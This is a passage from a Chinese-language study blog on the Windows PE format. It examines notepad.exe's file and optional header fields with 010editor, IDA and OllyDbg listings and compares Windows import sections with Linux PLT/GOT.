<td align="left">The application can handle addresses larger than 2 GB.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_BYTES_REVERSED_LO</strong>0x0080</td>
<td align="left">The bytes of the word are reversed. This flag is obsolete.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_32BIT_MACHINE</strong>0x0100</td>
<td align="left">The computer supports 32-bit words.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_DEBUG_STRIPPED</strong>0x0200</td>
<td align="left">Debugging information was removed and stored separately in another file.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP</strong>0x0400</td>
<td align="left">If the image is on removable media, copy it to and run it from the swap file.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_NET_RUN_FROM_SWAP</strong>0x0800</td>
<td align="left">If the image is on the network, copy it to and run it from the swap file.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_SYSTEM</strong>0x1000</td>
<td align="left">The image is a system file.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_DLL</strong>0x2000</td>
<td align="left">The image is a DLL file. While it is an executable file, it cannot be run directly.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_UP_SYSTEM_ONLY</strong>0x4000</td>
<td align="left">The file should be run only on a uniprocessor computer.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_BYTES_REVERSED_HI</strong>0x8000</td>
<td align="left">The bytes of the word are reversed. This flag is obsolete.</td>
</tr>
</tbody></table>
<p>notepad.exe中该值为010Fh(小端序)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711125018251.png" alt="image-20220711125018251"></p>
<p><code>010F=0100 | 0001 | 0002 | 0004 | 0008</code>,即集合了5个属性</p>
<p>包括:</p>
<p>0001:重定位信息被删,本程序必须加载到其可选头中规定的ImageBase处,否则报错</p>
<p>0002:可执行</p>
<p>0004:COFF行号被删</p>
<blockquote>
<p>COFF:common object file format.通用对象文件格式,这是Unix的目标文件格式,windows最初的目标文件就是抄的COFF</p>
</blockquote>
<blockquote>
<p>编译时加入-g选项就会生成,<code>gcc -g</code>,该选项的作用是生成调试信息,因此COFF行号的作用之一就是调试,之二是啥我目前不知道</p>
</blockquote>
<p>0008:COFF符号表被删</p>
<blockquote>
<p>符号表是从可重定位目标文件连接到可执行目标文件进行符号解析时需要的.</p>
<p>.o和.obj这种可重定位目标模块必须要有符号表</p>
<p>.exe和.out这种可执行目标模块不需要有</p>
<p>显然notepad.exe已经编译链接好了,不需要符号表了</p>
</blockquote>
<p>0100:计算机支持32位的字,意思是CPU可以一次性处理32位宽的数据.</p>
<blockquote>
<p>显然x86_32上的大部分寄存器(比如eax,esp)等都是32位宽的,总线宽度也是32位,CPU完全有能力一次性处理32位宽的数据</p>
</blockquote>
<h4 id="可选头"><a href="#可选头" class="headerlink" title="可选头"></a>可选头</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  WORD Magic;</span><br><span class="line">  BYTE MajorLinkerVersion;</span><br><span class="line">  BYTE MinorLinkerVersion;</span><br><span class="line">  DWORD SizeOfCode;</span><br><span class="line">  DWORD SizeOfInitializedData;</span><br><span class="line">  DWORD SizeOfUninitializedData;</span><br><span class="line">  DWORD AddressOfEntryPoint;</span><br><span class="line">  DWORD BaseOfCode;</span><br><span class="line">  DWORD BaseOfData;</span><br><span class="line">  DWORD ImageBase;</span><br><span class="line">  DWORD SectionAlignment;</span><br><span class="line">  DWORD FileAlignment;</span><br><span class="line">  WORD MajorOperatingSystemVersion;</span><br><span class="line">  WORD MinorOperatingSystemVersion;</span><br><span class="line">  WORD MajorImageVersion;</span><br><span class="line">  WORD MinorImageVersion;</span><br><span class="line">  WORD MajorSubsystemVersion;</span><br><span class="line">  WORD MinorSubsystemVersion;</span><br><span class="line">  DWORD Win32VersionValue;</span><br><span class="line">  DWORD SizeOfImage;</span><br><span class="line">  DWORD SizeOfHeaders;</span><br><span class="line">  DWORD CheckSum;</span><br><span class="line">  WORD Subsystem;</span><br><span class="line">  WORD DllCharacteristics;</span><br><span class="line">  DWORD SizeOfStackReserve;</span><br><span class="line">  DWORD SizeOfStackCommit;</span><br><span class="line">  DWORD SizeOfHeapReserve;</span><br><span class="line">  DWORD SizeOfHeapCommit;</span><br><span class="line">  DWORD LoaderFlags;</span><br><span class="line">  DWORD NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32,*PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>



<h5 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h5><p>区分本文件是32位还是64位又或者是ROM映像的魔数</p>
<p>magic&#x3D;0x10B表示32位</p>
<p>magic&#x3D;0x20B表示64位</p>
<p>magic&#x3D;0x107表示ROM映像</p>
<blockquote>
<p>前两个好理解,这第三个ROM映像是啥呢?</p>
<p>表明本程序是烧录到一个ROM存储器中的<strong>固件</strong></p>
<p>比如BIOS中的程序,CD-ROM中的程序等等</p>
</blockquote>
<p>winXP上的notepad.exe自然是32位的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711132424181.png" alt="image-20220711132424181"></p>
<p>010editor也帮我们把枚举类型10Bh翻译成了PE32</p>
<h5 id="Major-MinorLinkerVersion"><a href="#Major-MinorLinkerVersion" class="headerlink" title="Major&#x2F;MinorLinkerVersion"></a>Major&#x2F;MinorLinkerVersion</h5><p>主&#x2F;次链接器版本</p>
<p>对于notepad.exe这种已经编译链接完成的程序来说,自然这两个值白给</p>
<p>这两个值是相对于可重定位目标模块.o,.obj或者库文件.so,.dll这种需要参与链接的目标文件而言的</p>
<p>notepad.exe的这两个值分别是7和0</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711132938159.png" alt="image-20220711132938159"></p>
<blockquote>
<p>这个版本号应该是MSVC的版本,不是GCC的ld链接器的版本</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/v2-eb05f1dde948bdceb87f74864f6fe85d_1440w.jpg" alt="img"></p>
<p>根据notepad.exe的开发时间2001年,差不多就是MSVC++ 7.0的时间</p>
<p>而GCC ld到现在才是版本2</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711133034580.png" alt="image-20220711133034580"></p>
<p>就算是gcc本身的版本在2001年左右也才是3,目前在linux上是11,windows上是9</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711133237229.png" alt="image-20220711133237229"></p>
<p>胡乱写了一个main.c用gcc编译链接成main.exe然后用010editor打开观察,</p>
<p>发现主链接器版本确实就是ld的当前版本2</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134050894.png" alt="image-20220711134050894"></p>
<p>但是次链接器版本就是乱码了,看来这个值不重要</p>
</blockquote>
<h5 id="SizeOfCode"><a href="#SizeOfCode" class="headerlink" title="SizeOfCode"></a>SizeOfCode</h5><p>code节的大小,然而我从来没有见过叫.code的节,code不就是代码吗,不就是指令吗,不就是.text节咩?</p>
<p>在notepad.exe上SizeOfCode是6E00h</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134530037.png" alt="image-20220711134530037"></p>
<p>后面.text节区恰好就是6E00h这么大</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134550293.png" alt="image-20220711134550293"></p>
<h5 id="SizeOfInitializedData"><a href="#SizeOfInitializedData" class="headerlink" title="SizeOfInitializedData"></a>SizeOfInitializedData</h5><p>已初始化的数据节</p>
<p>notepad.exe中SizeOfInitializedData&#x3D;36864D&#x3D;9000H</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134856362.png" alt="image-20220711134856362"></p>
<p>.data和.rsrc节合起来才刚好是9000h这么大,看来不光是.data节,还得算上类似性质的节</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134923197.png" alt="image-20220711134923197"></p>
<blockquote>
<p>.data节是已初始化的全局变量和静态变量,这容易理解,那么.rsrc是个什么节呢?</p>
<p>查阅<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/debug/pe-format#the-rsrc-section">PE 格式 - Win32 apps | Microsoft Docs</a></p>
<p>rsrc节用来存放资源</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711135628794.png" alt="image-20220711135628794"></p>
<p>这里”资源”包括图标等,看介绍是以树形结构组织的,类似于HTML?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711135744137.png" alt="image-20220711135744137"></p>
</blockquote>
<h5 id="SizeOfUninitializedData"><a href="#SizeOfUninitializedData" class="headerlink" title="SizeOfUninitializedData"></a>SizeOfUninitializedData</h5><p>未初始化的数据节,应该是指.bss节,然而notepad.exe上该值为0,自然也就没有.bss节</p>
<p>(应该说节区头表中就没有.bss节的记录,真正的节区中永远都没有.bss节,因为它只会在执行时才会形成</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711135949436.png" alt="image-20220711135949436"></p>
<h5 id="AddressOfEntryPoint"><a href="#AddressOfEntryPoint" class="headerlink" title="AddressOfEntryPoint"></a>AddressOfEntryPoint</h5><p>入口点函数指针,具体指向谁呢?看看notepad.exe是啥样的</p>
<p>AddressOfEntryPoint&#x3D;6AE0</p>
<blockquote>
<p>这个值是个相对进程映像基地址ImageBase 的偏移量,或者叫RVA</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711141108874.png" alt="image-20220711141108874"></p>
<p>010editor给了提示,.text节中偏移量为0x5EE0的地方,为啥从6AE0变成5EE0了?</p>
<p>先用010editor看看0x5EE0这个地方发生了啥</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711141602298.png" alt="image-20220711141602298"></p>
<p>两个压栈,好像是函数开端的样子,然而两个地址分别是啥,这个问题还没有解决.</p>
<p>用ida打开notepad.exe观察<code>0x1006AE0</code>这个位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:01006AE0 ; __unwind &#123; // __SEH_prolog</span><br><span class="line">.text:01006AE0                 push    70h</span><br><span class="line">.text:01006AE2                 push    offset stru_1001888 ; struct _exception *</span><br><span class="line">.text:01006AE7                 call    __SEH_prolog</span><br><span class="line">.text:01006AEC                 xor     ebx, ebx</span><br></pre></td></tr></table></figure>

<p>发现这里的指令和在010editor中观察0x5EE0是一模一样的.</p>
<p>到底发生甚么事了?</p>
<blockquote>
<p>为啥是0x1006AE0不是0x6AE0?为啥不观察0x5EE0或者0x1005EE0?</p>
<p>ida打开的文件实际上是文件加载到内存之后的映像,不然任务管理器上看IDA为啥会一枝独秀地使用133.3M这么大的内存空间?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711142150809.png" alt="image-20220711142150809"></p>
<p>而010editor打开的是磁盘文件系统中躺着的静态文件</p>
<p>前面权位指南也讲过,两者是有很大差别的</p>
<p>文件系统中的静态文件都是从0开始计算偏移量RAW</p>
<p>进程映像则从一个指定的基地址开始计算实际虚拟地址空间中的地址,VA&#x3D;RVA+ImageBase</p>
<p>而notepad.exe的ImageBase就在可选头中规定为1000000h</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711142522560.png" alt="image-20220711142522560"></p>
<p>因此notepad.exe的进程映像就是从1000000h开始的,这就解释了为啥要用ida观察0x1006AE0,而不是0x6AE0</p>
<p>至于另一个问题,这是因为,节区在磁盘文件中存放和加载到内存映像中时,有不同的对齐要求</p>
<p>往往内存中的对齐要求更大,因此对于PE头和text节之间的空隙,进程映像中的更大,</p>
<p>因此text节的RAW(文件偏移 )和RVA(虚拟地址偏移)是不同的,并且有RVA&gt;RAW</p>
<p>更详细的原因需要学习后面的RAW to RVA,将进程从文件装载进入内存的知识</p>
</blockquote>
<h5 id="BaseOfCode"><a href="#BaseOfCode" class="headerlink" title="BaseOfCode"></a>BaseOfCode</h5><p>代码段在虚拟地址空间中的开始地址</p>
<p>notepad.exe这种BaseOfCode&#x3D;1000h,即虚拟内存中的相对偏移量RVA&#x3D;1000h,那么实际虚拟地址为VA&#x3D;Image+RVA&#x3D;1000000h+1000h&#x3D;1001000h</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711165812127.png" alt="image-20220711165812127"></p>
<p>使用ida观察这个<code>1001000h</code>地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.idata:01001000 ; Section 1. (virtual address 00001000)</span><br><span class="line">.idata:01001000 ; Virtual size                  : 00006D72 (  28018.)</span><br><span class="line">.idata:01001000 ; Section size in file          : 00006E00 (  28160.)</span><br><span class="line">.idata:01001000 ; Offset to raw data for section: 00000400</span><br><span class="line">.idata:01001000 ; Flags 60000020: Text Executable Readable</span><br><span class="line">.idata:01001000 ; Alignment     : default</span><br><span class="line">.idata:01001000 ;</span><br><span class="line">.idata:01001000 ; Imports from ADVAPI32.dll</span><br><span class="line">.idata:01001000 ;</span><br><span class="line">.idata:01001000 ; PDB File Name : notepad.pdb</span><br><span class="line">.idata:01001000</span><br><span class="line">.idata:01001000                 .686p</span><br><span class="line">.idata:01001000                 .mmx</span><br><span class="line">.idata:01001000                 .model flat</span><br><span class="line">.idata:01001000</span><br><span class="line">.idata:01001000 ; ===========================================================================</span><br><span class="line">.idata:01001000</span><br><span class="line">.idata:01001000 ; Segment type: Externs</span><br><span class="line">.idata:01001000 ; _idata</span><br><span class="line">.idata:01001000 ; LSTATUS __stdcall RegQueryValueExW(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)</span><br><span class="line">.idata:01001000                 extrn RegQueryValueExW:dword</span><br><span class="line">.idata:01001000                                         ; CODE XREF: RegGetInt(x,x,x)+32↓p</span><br><span class="line">.idata:01001000                                         ; RegGetString(x,x,x,x,x)+27↓p</span><br><span class="line">.idata:01001000                                         ; DATA XREF: ...</span><br><span class="line">.idata:01001004 ; LSTATUS __stdcall RegCloseKey(HKEY hKey)</span><br><span class="line">.idata:01001004                 extrn RegCloseKey:dword ; CODE XREF: SaveGlobals()+24A↓p</span><br><span class="line">.idata:01001004                                         ; GetGlobals()+29B↓p ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>发现是.idata节的开始</p>
<blockquote>
<p>ida在该节一开始给出了一块注释:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.idata:01001000 ; Section 1. (virtual address 00001000)</span><br><span class="line">.idata:01001000 ; Virtual size                  : 00006D72 (  28018.)</span><br><span class="line">.idata:01001000 ; Section size in file          : 00006E00 (  28160.)</span><br><span class="line">.idata:01001000 ; Offset to raw data for section: 00000400</span><br><span class="line">.idata:01001000 ; Flags 60000020: Text Executable Readable</span><br><span class="line">.idata:01001000 ; Alignment     : default</span><br></pre></td></tr></table></figure>

<p>第一节(相对虚拟地址1000h)</p>
<p>虚拟内存中的大小6D72h</p>
<p>磁盘文件中的大小6E00h</p>
<p>磁盘文件中的基地址400h</p>
<p>标志:60000020,意思是可执行可读 不可写</p>
<p>对齐:默认</p>
<p>这些都和010editor给出的结果相吻合</p>
</blockquote>
<p>问题是,<code>idata</code>名字里都带有<code>data</code>了,不应该算是数据吗?怎么就是代码了?</p>
<p>但是观察ida反汇编的结果,这里都是<code>extern</code>声明的函数接口,确实不是数据,但你说它是代码吧,它还没有实现</p>
<blockquote>
<p>微软对于该节给出的解释是:</p>
<p>These tables were added to the image to support a uniform mechanism for applications to delay the loading of a DLL until the first call into that DLL. The layout of the tables matches that of the traditional import tables that are described in section 6.4, <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-idata-section">The .idata Section</a>.” Only a few details are discussed here.</p>
<p>作用是允许DLL库函数在首次被调用是加载</p>
</blockquote>
<blockquote>
<p>win32exe程序中的idata节非常像linux可执行目标文件中的extern节,</p>
<p>也确实,因为ida给idata节一开始的注释就是<code>Segment Type:extern</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711170645587.png" alt="image-20220711170645587"></p>
<p>Linux上从<code>.text</code>到<code>extern</code>的调用顺序为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">首先是.text:000011C2                 call    _printf</span><br><span class="line">	</span><br><span class="line">然后是</span><br><span class="line">.plt:00001030 ; int printf(const char *format, ...)</span><br><span class="line">.plt:00001030 _printf         proc near               ; CODE XREF: main+25↓p</span><br><span class="line">.plt:00001030</span><br><span class="line">.plt:00001030 format          = dword ptr  4</span><br><span class="line">.plt:00001030</span><br><span class="line">.plt:00001030                 jmp     ds:off_400C     ; PIC mode</span><br><span class="line">.plt:00001030 _printf         endp</span><br><span class="line">.plt:00001030	</span><br><span class="line"></span><br><span class="line">然后是</span><br><span class="line">.got.plt:0000400C off_400C        dd offset printf        ; DATA XREF: _printf↑r</span><br><span class="line"></span><br><span class="line">然后是</span><br><span class="line">extern:0000402C ; int printf(const char *format, ...)</span><br><span class="line">extern:0000402C                 extrn printf:near       ; CODE XREF: _printf↑j</span><br><span class="line">extern:0000402C                                         ; DATA XREF: .got.plt:off_400C↑o</span><br></pre></td></tr></table></figure>

<p><code>.text-&gt;.plt-&gt;.got.plt-&gt;extern</code></p>
<p>类比windows上的32位exe是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先是.text:010069CC                 call    ds:IsTextUnicode</span><br><span class="line"></span><br><span class="line">然后是</span><br><span class="line">.idata:0100100C ; BOOL __stdcall IsTextUnicode(const void *lpv, int iSize, LPINT lpiResult)</span><br><span class="line">.idata:0100100C                 extrn IsTextUnicode:dword</span><br><span class="line">.idata:0100100C                                         ; CODE XREF: sub_10069BA+12↓p</span><br><span class="line">.idata:0100100C                                         ; DATA XREF: sub_10069BA+12↓r</span><br></pre></td></tr></table></figure>

<p><code>.text-&gt;.idata(extern)</code></p>
<p>windows上对动态库函数的调用貌似比linux上少了got,plt表这一步.</p>
</blockquote>
<p>windows上idata具体什么机制呢?这需要学了核心原理后面的IAT才能知道</p>
<h5 id="BaseOfData"><a href="#BaseOfData" class="headerlink" title="BaseOfData"></a>BaseOfData</h5><p>数据段的相对虚拟地址RVA</p>
<p>notepad.exe中该值为8000h,那么实际虚拟内存地址就是<code>1000000h+8000h=1008000h</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711171954659.png" alt="image-20220711171954659"></p>
<p>ida跳转该地址观察</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.data:01008000 ; Section 2. (virtual address 00008000)</span><br><span class="line">.data:01008000 ; Virtual size                  : 00001BA8 (   7080.)</span><br><span class="line">.data:01008000 ; Section size in file          : 00000600 (   1536.)</span><br><span class="line">.data:01008000 ; Offset to raw data for section: 00007200</span><br><span class="line">.data:01008000 ; Flags C0000040: Data Readable Writable</span><br><span class="line">.data:01008000 ; Alignment     : default</span><br><span class="line">.data:01008000 ; ===========================================================================</span><br><span class="line">.data:01008000</span><br><span class="line">.data:01008000 ; Segment type: Pure data</span><br><span class="line">.data:01008000 ; Segment permissions: Read/Write</span><br><span class="line">.data:01008000 _data           segment para public &#x27;DATA&#x27; use32</span><br><span class="line">.data:01008000                 assume cs:_data</span><br><span class="line">.data:01008000                 ;org 1008000h</span><br><span class="line">.data:01008000 ; BYTE Data</span><br><span class="line">.data:01008000 Data            dd 78h                  ; DATA XREF: NPCommand(x,x,x)+4D6↑r</span><br><span class="line">.data:01008000                                         ; NPCommand(x,x,x)+569↑w ...</span><br><span class="line">.data:01008004 dword_1008004   dd 1                    ; DATA XREF: CheckSave(x)+27↑r</span><br><span class="line">.data:01008004                                         ; CheckSave(x)+65↑r ...</span><br><span class="line">.data:01008008 ; WCHAR ClassName</span><br><span class="line">.data:01008008 ClassName:                              ; DATA XREF: sub_1004143+59↑o</span><br><span class="line">.data:01008008                                         ; NPInit(x,x,x,x)+10D↑o</span><br><span class="line">.data:01008008                 text &quot;UTF-16LE&quot;, &#x27;Notepad&#x27;,0</span><br><span class="line">.data:01008018 ; int dword_1008018</span><br><span class="line">.data:01008018 dword_1008018   dd 0FFFFFFFFh           ; DATA XREF: NpSaveDialogHookProc(x,x,x,x)+94↑r</span><br><span class="line">.data:01008018                                         ; NpOpenDialogHookProc(x,x,x,x)+4F↑w ...</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ida一开始给出的一块注释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:01008000 ; Section 2. (virtual address 00008000)</span><br><span class="line">.data:01008000 ; Virtual size                  : 00001BA8 (   7080.)</span><br><span class="line">.data:01008000 ; Section size in file          : 00000600 (   1536.)</span><br><span class="line">.data:01008000 ; Offset to raw data for section: 00007200</span><br><span class="line">.data:01008000 ; Flags C0000040: Data Readable Writable</span><br><span class="line">.data:01008000 ; Alignment     : default</span><br></pre></td></tr></table></figure>

<p>第二节(相对虚拟地址8000h)</p>
<p>虚拟内存中的大小1BA8h字节</p>
<p>磁盘文件中的大小600h字节</p>
<p>磁盘文件中本节的基地址7200h</p>
<p>标志:c0000040,数据段可读写,不可执行</p>
<p>对齐:默认</p>
</blockquote>
<h5 id="ImageBase"><a href="#ImageBase" class="headerlink" title="ImageBase"></a>ImageBase</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711172941299.png" alt="image-20220711172941299"></p>
<p>虚拟地址空间中进程的基地址,也就是PE头将会从0x1000000这个地址开始装载</p>
<p>这一点已经在前面的实验中多次证实了</p>
<blockquote>
<p>微软给出的解释是:</p>
<p>The preferred address of the first byte of the image when it is loaded in memory. This value is a multiple of 64K bytes. The default value for DLLs is 0x10000000. The default value for applications is 0x00400000, except on Windows CE where it is 0x00010000.</p>
<p>映像首个字节在装载进内存时最好使用ImageBase这个地址</p>
<p>ImageBase这个值必须是64K(0x10000)的倍数,也就是说,就算装不进0x1000000,下一个有效地址应该是0x1010000,再下一个就得是0x1020000,啃腚不会出现0x1011000这种ImageBase值</p>
<p>DLL动态库该值的默认值是0x10000000</p>
<p>应用程序该值默认为0x400000</p>
<p>应用程序在<code>windows CE</code>系统上该值为默认为0x10000</p>
</blockquote>
<p>显然notepad.exe的ImageBase&#x3D;0x1000000不是DLL的ImageBase默认值(注意零的个数不一样)</p>
<p>也不是应用程序的,它就非得搞那个特殊</p>
<p>我们自己写一个helloworld然后<code>gcc helloworld.c -O0 -o helloworld -m32</code>编译成一个32为程序,用010editor观察其ImageBase确实是0x400000</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711173959730.png" alt="image-20220711173959730"></p>
<blockquote>
<p>为啥ida最上最上只能观察到0x1001000这个位置?不是应当从0x1000000开始吗?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711174053133.png" alt="image-20220711174053133"></p>
<p>并且就算使用G企图跳转到1000000这个位置,ida也会报告Command “JumpAsk” failed</p>
<p>这是为啥?前面的东西让ida吃了?</p>
<p>原因是ida反汇编显示的只有PE体,即去掉PE头剩下的各节区(注意不是节区头表)</p>
<p>而ollydbg就可以Ctrl+G跳转到0x1000000这个位置</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711174407510.png" alt="image-20220711174407510"></p>
<p>上来是PE魔数0x5A 4D</p>
<p>而ollydbg的反汇编窗口把它也当成指令了</p>
<p>这时候应该看16进制视图</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711174508519.png" alt="image-20220711174508519"></p>
<p>可以看到最开始的MZ魔数</p>
</blockquote>
<h5 id="SectionAlignment"><a href="#SectionAlignment" class="headerlink" title="SectionAlignment"></a>SectionAlignment</h5><p>节对齐要求,每个节都必须按照该要求装进虚拟地址空间的合适位置</p>
<p>该值必须大于等于FileAlignment的值,这就解释了为啥进程映像在虚拟内存中的大小要比躺在为你文件中时要大</p>
<p>默认的SectionAlignment大小为一个页框的大小(win32上一个页框$4K&#x3D;2^{12}&#x3D;0x1000h$)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711185609155.png" alt="image-20220711185609155"></p>
<p>notepad.exe是满足该对齐要求的</p>
<h5 id="FileAlignment"><a href="#FileAlignment" class="headerlink" title="FileAlignment"></a>FileAlignment</h5><p>磁盘文件中的节对齐要求,这个值必须是一个2的幂$[2^8,2^{16}]$</p>
<p>默认是512,如果SectionAlignment的值比页框要小,则FileAlignment必须和SectionAlignment相同</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711185848617.png" alt="image-20220711185848617"></p>
<p>notepad.exe上由于SectionAlignment和页框一样大,因此FileAlignment可以小</p>
<p>实际上是默认值512&#x3D;200h</p>
<h5 id="Major-MinorOperatingSystemVersion"><a href="#Major-MinorOperatingSystemVersion" class="headerlink" title="Major&#x2F;MinorOperatingSystemVersion"></a>Major&#x2F;MinorOperatingSystemVersion</h5><p>主要&#x2F;次要操作系统版本号</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193701271.png" alt="image-20220711193701271"></p>
<p>这个版本号可以在CMD命令提示符上使用ver命令查询(在powershell上不能用这个命令)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\86135&gt;ver</span><br><span class="line"></span><br><span class="line">Microsoft Windows [版本 10.0.22621.105]</span><br></pre></td></tr></table></figure>

<p>系统版本号表:</p>
<table>
<thead>
<tr>
<th align="left">Operating system</th>
<th align="left">Version number</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows 11</td>
<td align="left">10.0*</td>
</tr>
<tr>
<td align="left">Windows 10</td>
<td align="left">10.0*</td>
</tr>
<tr>
<td align="left">Windows Server 2022</td>
<td align="left">10.0*</td>
</tr>
<tr>
<td align="left">Windows Server 2019</td>
<td align="left">10.0*</td>
</tr>
<tr>
<td align="left">Windows Server 2016</td>
<td align="left">10.0*</td>
</tr>
<tr>
<td align="left">Windows 8.1</td>
<td align="left">6.3*</td>
</tr>
<tr>
<td align="left">Windows Server 2012 R2</td>
<td align="left">6.3*</td>
</tr>
<tr>
